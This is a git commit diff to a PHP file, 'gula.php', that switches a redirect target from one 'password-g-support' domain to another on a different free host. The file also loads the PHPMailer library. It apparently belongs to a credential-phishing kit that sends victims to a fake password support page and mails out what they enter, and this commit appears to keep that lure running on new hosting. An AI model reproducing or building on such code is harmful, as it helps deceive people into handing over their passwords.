4c5c8f31c626896ac6883256f703f5e542f4052c
henyyjonyy <henyyjonyy@gmail.com>
2025-08-31 13:12:02 -0700

    Update gula.php

--- gula.php
+++ gula.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://password-g-support.vercel.app/");
+header("Location: https://password-g-support.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
